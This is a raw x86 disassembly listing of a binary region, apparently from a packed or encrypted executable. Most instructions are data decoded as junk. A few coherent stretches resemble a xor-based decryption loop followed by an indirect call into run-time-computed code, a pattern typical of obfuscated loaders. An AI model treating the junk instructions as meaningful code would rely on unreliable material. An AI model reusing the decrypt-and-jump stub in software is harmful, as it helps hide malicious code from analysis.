  40c501:	enter  0x8a5e,0xff
  40c505:	dec    eax
  40c506:	in     eax,0x6
  40c508:	enter  0xf17,0xef
  40c50c:	fst    QWORD PTR [edi+0x16e987d4]
  40c512:	mov    bl,0xd1
  40c514:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c515:	mov    eax,0x84513cc6
  40c51a:	mov    ecx,0x8736d5f6
  40c51f:	fnstenv ds:0x9bd97c47
  40c525:	pop    es
  40c526:	fistp  DWORD PTR [edi-0x197d29f9]
  40c52c:	lods   al,BYTE PTR ds:[esi]
  40c52d:	cwde   
  40c52e:	lods   al,BYTE PTR ds:[esi]
  40c52f:	leave  
  40c530:	cmp    al,0x8f
  40c532:	stc    
  40c533:	dec    esp
  40c534:	pop    esp
  40c535:	dec    edi
  40c536:	xchg   ebx,eax
  40c537:	push   esi
  40c538:	ficomp WORD PTR [edi+0x4c]
  40c53b:	xchg   edi,eax
  40c53c:	outs   dx,DWORD PTR ds:[esi]
  40c53d:	cmp    BYTE PTR [ebx-0x31ba6cc2],cl
  40c543:	inc    esp
  40c544:	cmc    
  40c545:	in     eax,0x47
  40c547:	mov    edi,0x7710094d
  40c54c:	cwde   
  40c54d:	mov    eax,0x9de9864e
  40c552:	arpl   WORD PTR [esi],bx
  40c554:	xlat   BYTE PTR ds:[ebx]
  40c555:	(bad)  
  40c556:	mov    esi,0xd3f2f17d
  40c55b:	fadd   QWORD PTR [edi+0x26959130]
  40c561:	jp     0x40c549
  40c563:	push   ebx
  40c564:	push   esp
  40c565:	ins    DWORD PTR es:[edi],dx
  40c566:	fs xchg esp,eax
  40c568:	mov    ebx,0x6d806714
  40c56d:	ret    0x11eb
  40c570:	mov    ch,0xb9
  40c572:	or     ebx,DWORD PTR [ebx-0xc]
  40c575:	and    ah,BYTE PTR [eax+0xb]
  40c578:	out    dx,eax
  40c579:	ret    
  40c57a:	mov    al,ds:0xd8fa8428
  40c57f:	inc    edx
  40c580:	or     DWORD PTR [edx],ebp
  40c582:	lahf   
  40c583:	jnp    0x40c5ac
  40c585:	sbb    ah,BYTE PTR [esi-0x67]
  40c588:	dec    edi
  40c589:	cmp    eax,0xecb73b5e
  40c58e:	ret    0xec03
  40c591:	sbb    ch,dl
  40c593:	push   es
  40c594:	inc    esp
  40c595:	dec    ebx
  40c596:	xchg   DWORD PTR [edx],esp
  40c598:	mov    al,0x67
  40c59a:	aad    0xf8
  40c59c:	es icebp 
  40c59e:	jnp    0x40c57f
  40c5a0:	mov    ebp,0x746e4129
  40c5a5:	xor    eax,ebx
  40c5a7:	ins    BYTE PTR es:[edi],dx
  40c5a8:	fstp   TBYTE PTR [esi+0x7e]
  40c5ab:	add    ebp,edi
  40c5ad:	aaa    
  40c5ae:	imul   eax,DWORD PTR [ebp+0x28],0xfffffff6
  40c5b2:	cli    
  40c5b3:	stc    
  40c5b4:	sbb    al,0x82
  40c5b6:	or     DWORD PTR [ebx-0x6b],edi
  40c5b9:	cmp    dl,bl
  40c5bb:	mov    dl,0x45
  40c5bd:	mov    ah,0xb
  40c5bf:	lods   al,BYTE PTR ds:[esi]
  40c5c0:	pushf  
  40c5c1:	pop    edi
  40c5c2:	xor    eax,0xcab7c5d6
  40c5c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5c8:	test   al,0x82
  40c5ca:	call   DWORD PTR [eax-0x1ff20ec5]
  40c5d0:	mov    ecx,0xd79e43e1
  40c5d5:	cmc    
  40c5d6:	xor    BYTE PTR ds:0xda2e94b2,al
  40c5dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5dd:	push   esp
  40c5de:	and    eax,0xc397e778
  40c5e3:	fxch   st(2)
  40c5e5:	rol    DWORD PTR [edi+ebp*8-0x34],cl
  40c5e9:	mov    eax,0xacc25c20
  40c5ee:	mov    esp,0xcb984d6a
  40c5f3:	cmp    al,0x9a
  40c5f5:	(bad)  
  40c5f6:	mov    al,0xdc
  40c5f8:	xchg   ebx,eax
  40c5f9:	imul   esi,DWORD PTR [esi],0x6bce5872
  40c5ff:	sahf   
  40c600:	ret    0x4887
  40c603:	jb     0x40c667
  40c605:	add    ch,BYTE PTR [ebx]
  40c607:	ret    0x3640
  40c60a:	test   eax,0x5ee49efb
  40c60f:	jge    0x40c65b
  40c611:	jge    0x40c60c
  40c613:	outs   dx,DWORD PTR ds:[esi]
  40c614:	int3   
  40c615:	mov    cl,0x72
  40c617:	and    eax,0x8fd224b2
  40c61c:	jae    0x40c66a
  40c61e:	fnstsw WORD PTR [esi]
  40c620:	lods   eax,DWORD PTR ds:[esi]
  40c621:	add    dl,BYTE PTR [eax]
  40c623:	jmp    0x5a761e0
  40c628:	aaa    
  40c629:	adc    ah,dl
  40c62b:	mov    bl,0xaa
  40c62d:	mov    ecx,0xadd780b0
  40c632:	les    esi,FWORD PTR [edx]
  40c634:	pop    esp
  40c635:	push   eax
  40c636:	mov    esi,0x90e76a29
  40c63b:	popa   
  40c63c:	mov    BYTE PTR [esi],cl
  40c63e:	retf   
  40c63f:	(bad)  
  40c640:	or     DWORD PTR [esi],ebx
  40c642:	(bad)  
  40c643:	sub    al,0x89
  40c645:	test   eax,0x288888b1
  40c64a:	fcom   st(6)
  40c64c:	xor    BYTE PTR ds:0x3d88501,0x6c
  40c653:	into   
  40c654:	mov    ecx,0xf05fcc65
  40c659:	jl     0x40c666
  40c65b:	cmp    dl,bh
  40c65d:	push   eax
  40c65e:	dec    DWORD PTR [eax]
  40c660:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c661:	jae    0x40c646
  40c663:	arpl   si,bx
  40c665:	adc    DWORD PTR [edi],eax
  40c667:	clc    
  40c668:	xlat   BYTE PTR ds:[ebx]
  40c669:	jbe    0x40c629
  40c66b:	in     al,0xf9
  40c66d:	cmp    al,dl
  40c66f:	or     BYTE PTR [esi],0xd5
  40c672:	add    al,0xae
  40c674:	(bad)  
  40c675:	push   eax
  40c676:	mov    ebx,0x40641a8a
  40c67b:	les    esp,FWORD PTR [ecx-0x7a0e0c05]
  40c681:	add    eax,0x86c87f46
  40c686:	jns    0x40c60e
  40c688:	in     eax,dx
  40c689:	call   DWORD PTR [eax+edx*8-0x7c2b28a]
  40c690:	xchg   BYTE PTR [ebx-0xb],bh
  40c693:	mov    ds:0x84f6cb91,eax
  40c698:	mov    esi,0x32729b
  40c69d:	add    edi,esi
  40c69f:	div    edi
  40c6a1:	mov    edx,DWORD PTR [ebp-0x4]
  40c6a4:	xor    edx,ecx
  40c6a6:	lea    eax,[edx+eax*1+0x32729b]
  40c6ad:	mov    edx,DWORD PTR [ebp+0x8]
  40c6b0:	mov    edi,DWORD PTR [ebp-0x24]
  40c6b3:	mov    DWORD PTR [edi+edx*4],eax
  40c6b6:	mov    eax,DWORD PTR [ebp-0x18]
  40c6b9:	mov    edx,DWORD PTR [ebp+0x8]
  40c6bc:	xor    eax,ecx
  40c6be:	lea    eax,[eax+edx*1+0x32729b]
  40c6c5:	mov    DWORD PTR [ebp+0x8],eax
  40c6c8:	mov    eax,DWORD PTR [ebp-0x18]
  40c6cb:	jmp    0x40c92e
  40c6d0:	leave  
  40c6d1:	adc    bl,ah
  40c6d3:	cmp    eax,0x10f1ede3
  40c6d8:	xor    BYTE PTR [ebp-0x5be653f],dl
  40c6de:	mov    dh,BYTE PTR [edx-0x22]
  40c6e1:	cmp    BYTE PTR [esi+0x7e],0x38
  40c6e5:	jl     0x40c765
  40c6e7:	jle    0x40c74c
  40c6e9:	push   0x12
  40c6eb:	fnstcw WORD PTR [edx+ebp*2]
  40c6ee:	push   edi
  40c6ef:	mov    bh,0x57
  40c6f1:	imul   esp,DWORD PTR [edx],0xffffffb0
  40c6f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6f5:	and    eax,0xc046604e
  40c6fa:	and    BYTE PTR [esi-0x75],dh
  40c6fd:	pusha  
  40c6fe:	test   BYTE PTR [edx-0x70],0x90
  40c702:	ds push esi
  40c704:	mov    ds:0xd9cfcdb3,al
  40c709:	loopne 0x40c71a
  40c70b:	push   ss
  40c70c:	dec    edx
  40c70d:	arpl   ax,di
  40c70f:	popf   
  40c710:	(bad)  
  40c711:	push   ss
  40c712:	xchg   esp,eax
  40c713:	inc    esp
  40c714:	cmp    BYTE PTR [edx-0x58],al
  40c717:	lods   al,BYTE PTR ds:[esi]
  40c718:	shl    BYTE PTR [esi],0x99
  40c71b:	rcr    BYTE PTR [ebx+eiz*8],1
  40c71e:	jno    0x40c70e
  40c720:	shr    BYTE PTR [edi+eiz*4+0x457feba0],cl
  40c727:	nop
  40c728:	je     0x40c797
  40c72a:	sar    BYTE PTR [ecx+0x31],cl
  40c72d:	popa   
  40c72e:	pop    ecx
  40c72f:	outs   dx,BYTE PTR ds:[esi]
  40c730:	xchg   ebx,eax
  40c731:	(bad)  
  40c732:	ss jecxz 0x40c783
  40c735:	pop    ss
  40c736:	test   eax,0x20712b5c
  40c73b:	inc    eax
  40c73c:	dec    esp
  40c73d:	push   esp
  40c73e:	inc    eax
  40c73f:	stos   BYTE PTR es:[edi],al
  40c740:	cs jne 0x40c795
  40c743:	inc    ebp
  40c744:	xlat   BYTE PTR ds:[ebx]
  40c745:	test   eax,0xbf59642d
  40c74a:	cmc    
  40c74b:	ret    0x4b8
  40c74e:	repz sbb al,0x47
  40c751:	scas   eax,DWORD PTR es:[edi]
  40c752:	scas   al,BYTE PTR es:[edi]
  40c753:	sti    
  40c754:	jmp    0x6d19e7f4
  40c759:	inc    edx
  40c75a:	dec    ebp
  40c75b:	or     al,0xe3
  40c75d:	ret    0xc20a
  40c760:	ins    DWORD PTR es:[edi],dx
  40c761:	push   ebp
  40c762:	inc    BYTE PTR [ecx-0x70]
  40c765:	(bad)  
  40c766:	mov    gs,WORD PTR [esi+edx*4]
  40c769:	fdiv   st(0),st
  40c76b:	fadd   QWORD PTR [edi]
  40c76d:	adc    edi,DWORD PTR [edi+ecx*8+0x196d7c11]
  40c774:	pop    edx
  40c775:	mov    al,0x4f
  40c777:	popa   
  40c778:	(bad)  
  40c779:	jge    0x40c707
  40c77b:	dec    edx
  40c77c:	inc    edx
  40c77d:	mov    ah,0x6a
  40c77f:	mov    dh,0x3b
  40c781:	in     eax,0x80
  40c783:	sbb    DWORD PTR [ebx],eax
  40c785:	dec    ebp
  40c786:	dec    BYTE PTR [ebp-0x26]
  40c789:	fwait
  40c78a:	jl     0x40c775
  40c78c:	out    dx,al
  40c78d:	aad    0xa9
  40c78f:	mov    WORD PTR [edx+0x79],?
  40c792:	ins    DWORD PTR es:[edi],dx
  40c793:	adc    BYTE PTR [ebx-0x5293cb0b],ch
  40c799:	xor    DWORD PTR [edi-0x15],ebp
  40c79c:	jmp    0x3bfb1ab8
  40c7a1:	aas    
  40c7a2:	jmp    FWORD PTR [esi+0x50]
  40c7a5:	pop    esp
  40c7a6:	outs   dx,DWORD PTR ds:[esi]
  40c7a7:	(bad)  
  40c7a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7a9:	mov    cl,0x46
  40c7ab:	imul   ecx,DWORD PTR [esi+edi*8],0xffffffed
  40c7af:	jmp    0x9814:0x673b7399
  40c7b6:	arpl   WORD PTR [ecx],si
  40c7b8:	aad    0xba
  40c7ba:	test   DWORD PTR [eax],esp
  40c7bc:	dec    eax
  40c7bd:	lea    edi,[eax-0x70]
  40c7c0:	icebp  
  40c7c1:	rcl    BYTE PTR ds:0x8f7898f5,0x7e
  40c7c8:	jmp    0x40c7e5
  40c7ca:	or     al,0xaa
  40c7cc:	pop    ss
  40c7cd:	adc    DWORD PTR [edi+0x46],edi
  40c7d0:	pop    ebx
  40c7d1:	pcmpgtd mm7,QWORD PTR [ecx-0xc2e413e]
  40c7d8:	mov    es:0xe04ffcdf,eax
  40c7de:	cmp    al,0xb5
  40c7e0:	mov    bh,BYTE PTR [edx+ebp*2-0x459a915d]
  40c7e7:	xchg   esi,eax
  40c7e8:	shr    BYTE PTR [eax],0x6b
  40c7eb:	hlt    
  40c7ec:	call   0x1d93031e
  40c7f1:	add    ebx,DWORD PTR [edx]
  40c7f3:	shl    BYTE PTR [eax+0x4f],0x6c
  40c7f7:	ins    BYTE PTR es:[edi],dx
  40c7f8:	xchg   ebx,eax
  40c7f9:	add    bl,bl
  40c7fb:	repnz (bad)
  40c7fe:	dec    ebp
  40c7ff:	and    BYTE PTR [ebp+0x3f],dh
  40c802:	bound  edx,QWORD PTR [edi+0x3ec9d939]
  40c808:	xchg   esi,eax
  40c809:	cwde   
  40c80a:	mov    dl,0x5b
  40c80c:	jmp    DWORD PTR [ebp+0x5a]
  40c80f:	popa   
  40c810:	push   esp
  40c811:	xor    ebx,ecx
  40c813:	outs   dx,DWORD PTR ds:[esi]
  40c814:	push   esp
  40c815:	repz adc cl,BYTE PTR [eax+0x197944c1]
  40c81c:	test   DWORD PTR [ebx],0x6f5783ff
  40c822:	loop   0x40c829
  40c824:	mov    eax,ds:0xb0de91c1
  40c829:	in     eax,0x7
  40c82b:	mov    al,ds:0xa92b8ac4
  40c830:	int3   
  40c831:	fs push eax
  40c833:	cmp    eax,0x1e704acd
  40c838:	push   ebx
  40c839:	dec    ebx
  40c83a:	or     al,cl
  40c83c:	xor    eax,0x5c967bb2
  40c841:	in     eax,0xbd
  40c843:	cdq    
  40c844:	fldenv [ebx-0x45]
  40c847:	dec    edx
  40c848:	aam    0x15
  40c84a:	retf   
  40c84b:	xlat   BYTE PTR ds:[ebx]
  40c84c:	(bad)  
  40c84d:	out    0xe6,eax
  40c84f:	jp     0x40c802
  40c851:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40c853:	sar    BYTE PTR [ecx+0x66],1
  40c856:	xchg   esp,eax
  40c857:	inc    edi
  40c858:	jle    0x40c819
  40c85a:	pop    ds
  40c85b:	loope  0x40c82d
  40c85d:	sahf   
  40c85e:	mov    dh,0xa7
  40c860:	ins    DWORD PTR es:[edi],dx
  40c861:	mov    ds,WORD PTR [eax+0x5aea8ecb]
  40c867:	mov    eax,ds:0xe10a068e
  40c86c:	cld    
  40c86d:	jae    0x40c89d
  40c86f:	das    
  40c870:	shr    DWORD PTR [ecx+eax*8-0x78850568],cl
  40c877:	cli    
  40c878:	jb     0x40c838
  40c87a:	call   0x676e5606
  40c87f:	mov    eax,DWORD PTR [ebx]
  40c881:	outs   dx,DWORD PTR ds:[esi]
  40c882:	sbb    bh,dh
  40c884:	lds    ebp,FWORD PTR [edx]
  40c886:	sub    DWORD PTR [eax+0x79],esp
  40c889:	int3   
  40c88a:	or     DWORD PTR [ebp+0x62],esi
  40c88d:	sar    DWORD PTR [ebp+0x4],cl
  40c890:	mov    bl,BYTE PTR [edx-0x3c]
  40c893:	adc    esp,DWORD PTR [ebp-0x3d]
  40c896:	cmp    al,0xfa
  40c898:	xchg   ebp,eax
  40c899:	dec    ebp
  40c89a:	sub    al,0x8c
  40c89c:	cmp    BYTE PTR [edx+0x2f],bl
  40c89f:	out    0xab,al
  40c8a1:	pop    edx
  40c8a2:	push   eax
  40c8a3:	or     BYTE PTR [ebp+0x56],cl
  40c8a6:	repz rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8a9:	cs (bad) 
  40c8ab:	in     eax,dx
  40c8ac:	mov    ebx,0xf0d19a29
  40c8b1:	sbb    al,0x37
  40c8b3:	or     ch,BYTE PTR [ecx+0x166f768b]
  40c8b9:	ds jbe 0x40c8e7
  40c8bc:	dec    esi
  40c8bd:	mov    esi,DWORD PTR [esi-0x67bd8544]
  40c8c3:	cmp    esi,edx
  40c8c5:	shr    BYTE PTR [ebp+0x2b7ac3d4],1
  40c8cb:	test   ch,al
  40c8cd:	jmp    0x40c8db
  40c8cf:	leave  
  40c8d0:	xor    eax,0x8848327
  40c8d5:	jbe    0x40c91f
  40c8d7:	jo     0x40c880
  40c8d9:	add    dh,BYTE PTR ds:0xc82dbac9
  40c8df:	push   0xffffffce
  40c8e1:	jnp    0x40c88f
  40c8e3:	cdq    
  40c8e4:	icebp  
  40c8e5:	in     al,dx
  40c8e6:	mov    al,ds:0x6550ec66
  40c8eb:	and    ch,bl
  40c8ed:	ret    0xc918
  40c8f0:	ret    0xc793
  40c8f3:	icebp  
  40c8f4:	cmp    eax,0xa182bfda
  40c8f9:	lds    eax,FWORD PTR [edx]
  40c8fb:	xor    bl,ah
  40c8fd:	dec    ebp
  40c8fe:	jg     0x40c8b5
  40c900:	cmp    BYTE PTR [ecx],ch
  40c902:	cwde   
  40c903:	cli    
  40c904:	sti    
  40c905:	xor    DWORD PTR [edi+0x19],esp
  40c908:	jae    0x40c91d
  40c90a:	es push es
  40c90c:	fistp  QWORD PTR [edx+esi*8]
  40c90f:	rcl    DWORD PTR [edx-0x1a448997],0xcc
  40c916:	test   bh,bh
  40c918:	or     DWORD PTR [eax-0x70f788f9],edi
  40c91e:	xor    bl,0xbc
  40c921:	es pop esi
  40c923:	in     eax,dx
  40c924:	ins    DWORD PTR es:[edi],dx
  40c925:	xor    BYTE PTR [esi],0x14
  40c928:	pop    esp
  40c929:	mov    bl,0xa8
  40c92b:	xchg   edx,eax
  40c92c:	leave  
  40c92d:	push   ebp
  40c92e:	mov    edx,DWORD PTR [ebp+0x14]
  40c931:	xor    eax,ecx
  40c933:	jmp    0x40cb96
  40c938:	pop    es
  40c939:	mov    ah,0x6
  40c93b:	cwde   
  40c93c:	mov    ch,0xa8
  40c93e:	mov    eax,ds:0x31ca67b1
  40c943:	cmp    DWORD PTR [ebp+0x30],esp
  40c946:	and    cl,ch
  40c948:	cwde   
  40c949:	mov    ?,WORD PTR [esi+0x7e]
  40c94c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c950:	jg     0x40c9b8
  40c952:	pop    ebp
  40c953:	test   DWORD PTR [ebp+0x1e],0xab098e5d
  40c95a:	nop
  40c95b:	or     edi,ecx
  40c95d:	hlt    
  40c95e:	sub    DWORD PTR [eax+0x38],edi
  40c961:	aaa    
  40c962:	int3   
  40c963:	pop    ebx
  40c964:	jo     0x40c98f
  40c966:	xor    eax,0x1e420b3c
  40c96b:	ja     0x40c9b0
  40c96d:	push   ecx
  40c96e:	icebp  
  40c96f:	ins    BYTE PTR es:[edi],dx
  40c970:	sbb    BYTE PTR [esp+eax*1],dl
  40c973:	cwde   
  40c974:	lds    ecx,FWORD PTR [ecx+0x6d]
  40c977:	(bad)  
  40c978:	aad    0xbf
  40c97a:	push   esp
  40c97b:	shl    DWORD PTR [edi],1
  40c97d:	push   edi
  40c97e:	lds    eax,FWORD PTR [ebx]
  40c980:	mov    ah,dh
  40c982:	fnstsw WORD PTR [edx-0x69]
  40c985:	int3   
  40c986:	mov    ch,0x43
  40c988:	in     eax,0x6f
  40c98a:	add    BYTE PTR [eax-0x44b2719b],bl
  40c990:	add    ecx,eax
  40c992:	mov    dh,0xa5
  40c994:	or     edx,ecx
  40c996:	(bad)  
  40c999:	cmp    DWORD PTR [ebx-0x40],ebx
  40c99c:	jle    0x40c9d2
  40c99e:	and    eax,0x3db0b206
  40c9a3:	cs jmp 0x70f8:0x393876ad
  40c9ab:	in     al,dx
  40c9ac:	jg     0x40ca11
  40c9ae:	mov    ?,WORD PTR [edx+0x7]
  40c9b1:	imul   ebx,ebp,0x65
  40c9b4:	push   0x7eff0edc
  40c9b9:	(bad)
  40c9bd:	push   ebp
  40c9be:	pop    es
  40c9bf:	mov    bl,BYTE PTR [esi]
  40c9c1:	bound  esi,QWORD PTR [esi]
  40c9c3:	dec    ebp
  40c9c4:	inc    edi
  40c9c5:	add    DWORD PTR [eax+0x5adcd1ec],ebp
  40c9cb:	bnd jle 0x40c96f
  40c9ce:	loop   0x40c9f1
  40c9d0:	out    dx,eax
  40c9d1:	jecxz  0x40c959
  40c9d3:	pop    ecx
  40c9d4:	add    edx,eax
  40c9d6:	adc    cl,BYTE PTR [ebx+0x4d739a39]
  40c9dc:	inc    ecx
  40c9dd:	add    eax,0xc353990b
  40c9e2:	mov    esi,0xaf6748bb
  40c9e7:	mov    WORD PTR [esi-0x3c5c2f38],?
  40c9ed:	gs rcl dh,cl
  40c9f0:	jnp    0x40ca63
  40c9f2:	std    
  40c9f3:	add    BYTE PTR [esp+ebp*8-0x10],dl
  40c9f7:	inc    edx
  40c9f8:	and    BYTE PTR [ebx+0x519c8181],dl
  40c9fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9ff:	cmp    BYTE PTR cs:[edi],dl
  40ca02:	mov    ah,0x17
  40ca04:	sub    al,0xef
  40ca06:	(bad)  
  40ca07:	loopne 0x40ca28
  40ca09:	cmc    
  40ca0a:	pop    ebx
  40ca0b:	mov    bl,0x70
  40ca0d:	lods   eax,DWORD PTR ds:[esi]
  40ca0e:	adc    edi,DWORD PTR [ecx-0x59]
  40ca11:	or     DWORD PTR [esp-0x5364b50f],esp
  40ca18:	or     dl,ah
  40ca1a:	push   0x30d27b49
  40ca1f:	dec    BYTE PTR [edi-0x6a08925c]
  40ca25:	fimul  DWORD PTR [ecx]
  40ca27:	jns    0x40ca1a
  40ca29:	int    0xcf
  40ca2b:	mov    eax,0x2336149d
  40ca30:	mov    dh,0x94
  40ca32:	fcmovne st,st(7)
  40ca34:	cmc    
  40ca35:	loop   0x40ca9a
  40ca37:	pop    edi
  40ca38:	xor    DWORD PTR [ebx],0x62
  40ca3b:	jnp    0x40ca08
  40ca3d:	and    ebp,DWORD PTR [ebp-0x122108ac]
  40ca43:	dec    eax
  40ca44:	push   eax
  40ca45:	pop    eax
  40ca46:	sub    eax,0xcb880b16
  40ca4b:	std    
  40ca4c:	lahf   
  40ca4d:	das    
  40ca4e:	pop    ebp
  40ca4f:	or     eax,DWORD PTR [edx-0x53a9278b]
  40ca55:	ret    0xba02
  40ca58:	mov    dh,cl
  40ca5a:	imul   eax,ecx,0xdc3b6273
  40ca60:	push   edi
  40ca61:	ss push edx
  40ca63:	retf   0xea24
  40ca66:	pop    ebx
  40ca67:	mov    bh,BYTE PTR [ecx-0x9]
  40ca6a:	sbb    dh,ah
  40ca6c:	cld    
  40ca6d:	ja     0x40ca62
  40ca6f:	inc    eax
  40ca70:	loopne 0x40c9fd
  40ca72:	das    
  40ca73:	sbb    BYTE PTR ds:0xe1fdf716,0xb6
  40ca7a:	mul    DWORD PTR [edi+0x6ff974e0]
  40ca80:	jnp    0x40cad0
  40ca82:	cmc    
  40ca83:	xchg   esi,eax
  40ca84:	sbb    edi,ebp
  40ca86:	imul   eax,DWORD PTR [ecx+0x72],0xabd9c4ec
  40ca8d:	sbb    ah,ch
  40ca8f:	sub    edi,ebp
  40ca91:	int    0x3
  40ca93:	test   BYTE PTR [edi+0x3b],0xbf
  40ca97:	jp     0x40cb14
  40ca99:	mov    al,ds:0xd742cce3
  40ca9e:	bound  ecx,QWORD PTR [ecx-0x28]
  40caa1:	cmovge eax,edx
  40caa4:	test   al,0xbc
  40caa6:	fistp  WORD PTR [esp+esi*8]
  40caa9:	push   edx
  40caaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40caab:	push   0x2cb0ca53
  40cab0:	pop    esp
  40cab1:	pusha  
  40cab2:	fwait
  40cab3:	push   edi
  40cab4:	sub    bl,ch
  40cab6:	inc    edx
  40cab7:	inc    BYTE PTR [edi+0x28]
  40caba:	xor    eax,0xac9e876f
  40cabf:	aas    
  40cac0:	xor    BYTE PTR [ebp+0x161bf20e],al
  40cac6:	shl    BYTE PTR [eax+0xe],cl
  40cac9:	push   es
  40caca:	dec    edi
  40cacb:	mov    esi,0x3f6324f0
  40cad0:	cmp    al,0xe8
  40cad2:	in     al,0x2c
  40cad4:	cmc    
  40cad5:	cmp    eax,0x70957d2
  40cada:	mov    eax,0x3ba245db
  40cadf:	icebp  
  40cae0:	pop    eax
  40cae1:	jp     0x40cb32
  40cae3:	iret   
  40cae4:	pop    esp
  40cae5:	pop    edi
  40cae6:	xor    ebx,DWORD PTR [esi+0x7b]
  40cae9:	jo     0x40caca
  40caeb:	xchg   esi,eax
  40caec:	ss or  eax,0x3e13f367
  40caf2:	xor    esp,ebx
  40caf4:	scas   al,BYTE PTR es:[edi]
  40caf5:	cmp    DWORD PTR [ebp+0x4692b260],edx
  40cafb:	addr16 jge 0x40cae6
  40cafe:	call   0x36e46c0e
  40cb03:	or     eax,esp
  40cb05:	(bad)
  40cb08:	mov    ecx,esp
  40cb0a:	cmp    edi,ecx
  40cb0c:	mov    al,ds:0x5932727c
  40cb11:	xchg   DWORD PTR [edx+0x1e83b55f],ebx
  40cb17:	repz cmp al,0x3f
  40cb1a:	add    ecx,DWORD PTR [esi-0x6ef9bcf7]
  40cb20:	or     ah,BYTE PTR [edi]
  40cb22:	xchg   DWORD PTR [ebx],ecx
  40cb24:	mov    fs,edi
  40cb26:	mov    al,ds:0xa1412a9
  40cb2b:	out    dx,al
  40cb2c:	mov    bl,0xc0
  40cb2e:	pop    ecx
  40cb2f:	push   ss
  40cb30:	mov    bl,0x76
  40cb32:	adc    bl,BYTE PTR [edi]
  40cb34:	stos   BYTE PTR es:[edi],al
  40cb35:	lock add esi,DWORD PTR [ecx+0x1e]
  40cb39:	fist   DWORD PTR [edi-0x9878212]
  40cb3f:	ficom  WORD PTR [eax+edx*4+0x746dba4e]
  40cb46:	push   ds
  40cb47:	enter  0x28bb,0x3f
  40cb4b:	mov    esp,0x5f7b81eb
  40cb50:	in     eax,dx
  40cb51:	popf   
  40cb52:	push   eax
  40cb53:	dec    esi
  40cb54:	(bad)  
  40cb55:	jns    0x40cad7
  40cb57:	jmp    0x3dbacc4f
  40cb5c:	nop
  40cb5d:	mov    ds:0x6d6e4554,al
  40cb62:	aaa    
  40cb63:	xchg   ecx,eax
  40cb64:	jmp    0x40cbcf
  40cb66:	add    bh,BYTE PTR [esi]
  40cb68:	push   ecx
  40cb69:	add    ch,ah
  40cb6b:	add    al,0x87
  40cb6d:	mov    al,ds:0xd9e886b4
  40cb72:	(bad)  [esi+0x416502b4]
  40cb78:	cmc    
  40cb79:	data16 lock sti 
  40cb7c:	or     al,0x1f
  40cb7e:	fimul  DWORD PTR [ebx+0x65]
  40cb81:	sar    DWORD PTR [edx],cl
  40cb83:	lahf   
  40cb84:	cmp    DWORD PTR [edi+0x32],eax
  40cb87:	push   eax
  40cb88:	out    dx,al
  40cb89:	xlat   BYTE PTR ds:[ebx]
  40cb8a:	adc    ebx,DWORD PTR [ebx]
  40cb8c:	dec    eax
  40cb8d:	je     0x40cb62
  40cb8f:	popf   
  40cb90:	imul   esi,DWORD PTR [ebx-0x15],0x3d7a08a
  40cb97:	(bad)  
  40cb98:	imul   eax,DWORD PTR [edx]
  40cb9b:	mov    edx,DWORD PTR [ebp-0x4]
  40cb9e:	xor    edx,ecx
  40cba0:	mov    ecx,DWORD PTR [ebp+0x8]
  40cba3:	lea    ecx,[edx+ecx*1+0x32729b]
  40cbaa:	cmp    ecx,eax
  40cbac:	jne    0x40c41f
  40cbb2:	mov    ebx,esi
  40cbb4:	jmp    0x40cbbe
  40cbb9:	mov    ebx,0x32729b
  40cbbe:	mov    eax,DWORD PTR [ebp-0x4]
  40cbc1:	xor    eax,0x7510854
  40cbc6:	add    eax,ebx
  40cbc8:	mov    DWORD PTR [ebp-0xc],eax
  40cbcb:	xor    ebx,ebx
  40cbcd:	lea    eax,[ebp-0x10]
  40cbd0:	add    ebx,DWORD PTR [eax]
  40cbd2:	call   ebx
  40cbd4:	xor    ebx,ebx
  40cbd6:	inc    ebx
  40cbd7:	cmp    DWORD PTR [ebp+0x10],ebx
  40cbda:	je     0x40d321
  40cbe0:	xchg   edx,eax
  40cbe1:	push   0xa
  40cbe3:	pop    ecx
  40cbe4:	push   0x4
  40cbe6:	pop    ebx
  40cbe7:	inc    ebx
  40cbe8:	xchg   ebx,ecx
  40cbea:	jmp    0x40ce4d
  40cbef:	imul   edx,DWORD PTR [edi-0x4b0ecbf3],0x73
  40cbf6:	push   ecx
  40cbf7:	int3   
  40cbf8:	xor    esp,DWORD PTR [esi+edi*8+0x39]
  40cbfc:	ror    ebx,0x4c
  40cbff:	bound  ecx,QWORD PTR [esi+edi*2+0x7e7c387e]
  40cc06:	jle    0x40cc26
  40cc08:	fiadd  WORD PTR [edi]
  40cc0a:	xchg   esp,eax
  40cc0b:	call   0x6fd40c01
  40cc10:	mov    ah,0xb5
  40cc12:	mul    BYTE PTR [edi-0x76267e4e]
  40cc18:	adc    BYTE PTR [esi+0x12],0x60
  40cc1c:	jp     0x40cbb8
  40cc1e:	add    DWORD PTR [edx+0x5cdbfc17],edx
  40cc24:	jge    0x40cc8c
  40cc26:	jb     0x40cc10
  40cc28:	xor    ch,BYTE PTR [esi*1+0x17af72e0]
  40cc2f:	pop    eax
  40cc30:	cld    
  40cc31:	cli    
  40cc32:	out    dx,al
  40cc33:	gs hlt 
  40cc35:	dec    ecx
  40cc36:	rol    DWORD PTR ds:0xc3688375,1
  40cc3c:	sub    BYTE PTR [ebx+0x66293d99],dh
  40cc42:	cli    
  40cc43:	sub    BYTE PTR [ecx],dl
  40cc45:	mov    ecx,0xe7a9a3f6
  40cc4a:	jbe    0x40cc80
  40cc4c:	(bad)  
  40cc4d:	jmp    DWORD PTR [edi+0x4e]
  40cc50:	lods   eax,DWORD PTR ds:[esi]
  40cc51:	loopne 0x40cca3
  40cc53:	push   ds
  40cc54:	test   eax,0x71a07498
  40cc59:	mov    edx,0x888f3271
  40cc5e:	push   ebp
  40cc5f:	add    ch,BYTE PTR [edi]
  40cc61:	in     eax,0x4d
  40cc63:	sub    DWORD PTR [edx],edx
  40cc65:	and    eax,0x21c3c9c7
  40cc6a:	(bad)  
  40cc6b:	mov    ebx,0x3001d98f
